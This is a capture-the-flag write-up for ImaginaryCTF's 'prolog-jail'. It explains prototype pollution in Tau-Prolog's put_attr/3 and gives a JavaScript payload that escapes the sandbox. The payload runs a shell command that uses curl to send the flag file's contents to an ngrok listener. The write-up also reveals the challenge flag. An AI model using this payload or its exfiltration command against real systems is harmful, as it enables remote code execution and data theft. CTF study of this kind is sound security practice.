# prolog-jail — ImaginaryCTF Writeup

**Challenge:** prolog-jail  
**Category:** Misc  
**Difficulty:** Hard  
**Points:** 125 pts  
**Flag:** `ictf{tata-tautau-tatata-tautau-tatautatau!!!}`

---

## Description

> Escape from prolog! note: The container takes a few minutes to start.

**Site:** `http://155.248.210.243:42145`

---

## Background Knowledge (Read This First!)

### What is Tau-Prolog?

**Tau-Prolog** is a Prolog interpreter written in JavaScript (Node.js). This challenge looks like a Prolog sandbox escape — but it is actually a **Node.js jail** disguised as Prolog.

### What is Prototype Pollution?

**Prototype pollution** is a JavaScript vulnerability where an attacker modifies `Object.prototype` — the base object that all JavaScript objects inherit from. By setting properties on `__proto__`, every object in the runtime inherits those properties.

### What is the Vulnerability?

Tau-Prolog's `put_attr/3` predicate has a prototype pollution vulnerability. It sets arbitrary fields on `Object.prototype`, with a `Term` class value. This allows:

1. Overriding `opts.context_module` to prepend arbitrary strings to the next goal
2. Setting up fake module/rule structures in the session
3. Calling `shell/1` (from the `os` library) to execute system commands

Since you cannot see shell output directly, you exfiltrate via `curl` sending the flag to your server.

---

## Solution

### Step 1 — Set up a listener to receive the flag

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ ngrok http 8080
# → Get your public URL: https://your-url.ngrok.io
```

### Step 2 — Send the exploit payload to the Prolog interface

```javascript
cmd = `bash -c "curl https://your-url.ngrok.io/$(cat flag*)"`

let q = `:- use_module(library(os)).`.replaceAll("
","").replaceAll("    ","");
q = `consult(\'${q}\').`
q = `
put_attr(__proto__, context_module, '${q}%').
put_attr(__proto__, '${q}%', x).
put_attr(__proto__, rules, x).
put_attr(__proto__, modules, x).
put_attr(__proto__, 'term_expansion/2', x).
put_attr(__proto__, 'X', :-(:('${q}%',flag(X)),os:shell('${cmd}'))).
put_attr(__proto__, length, 3).
`.replaceAll("
", "");
```

### Step 3 — Check your ngrok listener for the flag

```
# → Flag arrives in the URL path of the curl request
# → ictf{tata-tautau-tatata-tautau-tatautatau!!!}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| ngrok | Receive the exfiltrated flag | ⭐⭐ Medium |
| JavaScript prototype pollution | Exploit Tau-Prolog's put_attr/3 | ⭐⭐⭐ Hard |

---

## Key Takeaways

- "Prolog jail" that is actually Node.js — always check the underlying runtime
- Prototype pollution via `__proto__` affects all objects in the JavaScript runtime
- When you cannot see output, exfiltrate via curl to your own server
- The hint links to the exact vulnerable line in the Tau-Prolog source code
